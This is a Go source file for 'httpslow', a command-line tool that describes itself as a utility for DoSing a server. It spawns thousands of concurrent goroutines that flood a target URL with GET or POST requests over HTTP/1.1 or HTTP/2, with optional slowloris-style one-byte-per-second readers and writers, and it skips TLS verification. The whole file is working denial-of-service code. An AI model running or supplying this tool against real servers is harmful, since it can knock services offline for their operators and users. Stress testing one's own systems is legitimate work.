package main

import (
	"crypto/tls"
	"github.com/efigence/go-libs/ewma"
	"github.com/urfave/cli"
	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
	"golang.org/x/net/http2"
	"io"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"time"
)

var version string
var log *zap.SugaredLogger
var debug = true
var exit = make(chan bool, 1)
var client = &http.Client{
	Timeout: time.Minute,
}
var rate = ewma.NewEwmaRate(time.Second * 2)

func init() {
	consoleEncoderConfig := zap.NewDevelopmentEncoderConfig()
	// naive systemd detection. Drop timestamp if running under it
	if os.Getenv("INVOCATION_ID") != "" || os.Getenv("JOURNAL_STREAM") != "" {
		consoleEncoderConfig.TimeKey = ""
	}
	consoleEncoderConfig.EncodeLevel = zapcore.CapitalColorLevelEncoder
	consoleEncoder := zapcore.NewConsoleEncoder(consoleEncoderConfig)
	consoleStderr := zapcore.Lock(os.Stderr)
	_ = consoleStderr

	// if needed point differnt priority log to different place
	highPriority := zap.LevelEnablerFunc(func(lvl zapcore.Level) bool {
		return lvl >= zapcore.ErrorLevel
	})
	lowPriority := zap.LevelEnablerFunc(func(lvl zapcore.Level) bool {
		return lvl < zapcore.ErrorLevel
	})
	core := zapcore.NewTee(
		zapcore.NewCore(consoleEncoder, os.Stderr, lowPriority),
		zapcore.NewCore(consoleEncoder, os.Stderr, highPriority),
	)
	logger := zap.New(core)
	if debug {
		logger = logger.WithOptions(
			zap.Development(),
			zap.AddCaller(),
			zap.AddStacktrace(highPriority),
		)
	} else {
		logger = logger.WithOptions(
			zap.AddCaller(),
		)
	}
	log = logger.Sugar()

}

func main() {
	app := cli.NewApp()
	app.Name = "httpslow"
	app.Description = "testing utility for DoSing a server"
	app.Version = version
	app.HideHelp = true
	app.Flags = []cli.Flag{
		cli.BoolFlag{Name: "help, h", Usage: "show help"},
		cli.BoolFlag{Name: "http1, 1", Usage: "use http 1.1"},
		cli.BoolFlag{Name: "post, p", Usage: "post"},
		cli.BoolFlag{Name: "slow, s", Usage: "use slow reader/writer"},
		cli.StringFlag{
			Name:   "url",
			Value:  "http://127.0.0.1",
			Usage:  "Target URL",
			EnvVar: "_URL",
		},
		cli.IntFlag{
			Name:  "concurrency,c",
			Usage: "set request concurrency",
			Value: 5000,
		},
	}
	app.Action = func(c *cli.Context) error {
		if c.Bool("help") {
			cli.ShowAppHelp(c)
			os.Exit(1)
		}

		log.Infof("Starting %s version: %s", app.Name, version)
		log.Infof("var example %s", c.GlobalString("url"))
		requester(c)
		return nil
	}

	// to sort do that
	//sort.Sort(cli.FlagsByName(app.Flags))
	//sort.Sort(cli.CommandsByName(app.Commands))
	app.Run(os.Args)
}

type SlowReader struct {
}

func (s SlowReader) Read(p []byte) (n int, err error) {
	time.Sleep(time.Second)
	if len(p) > 0 {
		rand.Read(p[:1])
		return 1, nil
	} else {
		return 0, nil
	}

}

type RandReader struct {
}

func (s RandReader) Read(p []byte) (n int, err error) {
	time.Sleep(time.Second)
	if len(p) > 0 {
		rand.Read(p[:len(p)-1])
		return 1, nil
	} else {
		return 0, nil
	}

}

func requester(c *cli.Context) {
	concurrency := c.Int("concurrency")
	url := c.String("url")
	wg := sync.WaitGroup{}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}
	if c.Bool("http1") {
		client.Transport = &http.Transport{
			TLSClientConfig: tlsConfig,
		}
	} else {
		client.Transport = &http2.Transport{
			TLSClientConfig: tlsConfig,
		}
	}
	resp, err := client.Get(url)
	if err != nil {
		log.Fatalln(err)
	}
	log.Infof("proto: %s", resp.Proto)
	log.Infof("starting dos")
	lastErr := time.Now().Unix()
	lastErrLock := sync.Mutex{}
	var gr func()
	var reader io.Reader
	if c.Bool("slow") {
		log.Infof("SlowReader")
		reader = &SlowReader{}
	} else {
		reader = &RandReader{}
	}
	if c.Bool("post") {
		log.Infof("POST")
		gr = func() {
			for {
				url := c.String("url")
				resp, err := client.Post(url, "text/plain", reader)
				_ = resp
				_ = err
				if err != nil {
					lastErrLock.Lock()
					now := time.Now().Unix()
					if now != lastErr {
						log.Infof("%s", err)
						lastErr = now
					}
					lastErrLock.Unlock()
				}

				rate.UpdateNow()
			}
			wg.Done()
		}
	} else {
		log.Infof("GET")
		if c.Bool("slow") {
			gr = func() {
				for {
					buf := make([]byte, 1024)
					url := c.String("url")
					resp, err := client.Get(url)
					for err != nil {
						_, err = resp.Body.Read(buf)
						time.Sleep(time.Second)
					}
					rate.UpdateNow()
				}
				wg.Done()
			}
		} else {
			gr = func() {
				for {
					url := c.String("url")
					resp, err := client.Get(url)
					_ = resp
					_ = err
					rate.UpdateNow()
				}
				wg.Done()
			}
		}
	}
	log.Infof("spawning %d concurrent connections", concurrency)
	for i := 1; i <= concurrency; i++ {
		wg.Add(1)
		go gr()
	}
	go func() {
		for {
			time.Sleep(time.Second * 2)
			log.Infof("rate: %.2f", rate.CurrentNow())
		}
	}()

	log.Infof("running")
	wg.Wait()
}
